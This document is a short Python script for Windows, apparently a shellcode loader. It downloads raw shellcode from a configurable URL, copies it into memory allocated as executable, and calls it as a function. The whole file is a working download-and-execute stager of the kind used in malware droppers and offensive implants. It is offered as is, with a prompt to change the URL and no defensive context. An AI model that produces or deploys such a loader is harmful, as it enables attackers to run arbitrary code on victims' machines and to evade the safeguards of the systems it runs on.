import requests
from ctypes import *
from ctypes import wintypes

URL = "http://127.0.0.1:8000/shellcode"  # change this line

SIZE_T = c_size_t
NTSTATUS = wintypes.DWORD
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READ_WRITE = 0x40

VirtualAlloc = windll.kernel32.VirtualAlloc
VirtualAlloc.argtypes = (
    wintypes.LPVOID,
    SIZE_T,
    wintypes.DWORD,
    wintypes.DWORD
)
VirtualAlloc.restype = wintypes.LPVOID

VirtualProtect = windll.kernel32.VirtualProtect
VirtualProtect.argtypes = (
    wintypes.LPVOID,
    SIZE_T,
    wintypes.DWORD,
    POINTER(wintypes.DWORD)
)
VirtualProtect.restype = wintypes.BOOL

print("Fetching shellcode from server...")

response = requests.get(URL)
shellcode = response.content
shellcode_length = len(shellcode)

print(f"Shellcode fetched: {shellcode_length} bytes.")

ProcessHandle = 0xffffffffffffffff
BaseAddress = wintypes.LPVOID(0x0)
ZeroBits = wintypes.ULONG(0)

PAGE_SIZE = 4096
RegionSize = SIZE_T((shellcode_length + PAGE_SIZE - 1) // PAGE_SIZE * PAGE_SIZE)
AllocationType = MEM_COMMIT | MEM_RESERVE

allocated_memory = VirtualAlloc(
    BaseAddress,
    RegionSize,
    AllocationType,
    PAGE_EXECUTE_READ_WRITE
)

if allocated_memory == 0:
    raise RuntimeError("VirtualAlloc failed. Memory allocation error.")

print(f"Memory allocated at -> {hex(allocated_memory)}")

shellcode_ptr = (c_char * shellcode_length).from_buffer_copy(shellcode)
RtlCopyMemory = windll.kernel32.RtlCopyMemory
RtlCopyMemory.argtypes = (wintypes.LPVOID, wintypes.LPCVOID, SIZE_T)
RtlCopyMemory.restype = None

RtlCopyMemory(
    allocated_memory,
    shellcode_ptr,
    shellcode_length
)

print("Shellcode copied to allocated memory.")

NewProtect = PAGE_EXECUTE_READ_WRITE
OldProtect = wintypes.DWORD(0)

res = VirtualProtect(
    allocated_memory,
    RegionSize,
    NewProtect,
    byref(OldProtect)
)

if not res:
    raise RuntimeError("VirtualProtect failed. Memory protection error.")

print("Memory protection updated to PAGE_EXECUTE_READ_WRITE.")

shellcode_func = CFUNCTYPE(None)

shellcode_callable = cast(allocated_memory, shellcode_func)

print("Executing shellcode...")

shellcode_callable()
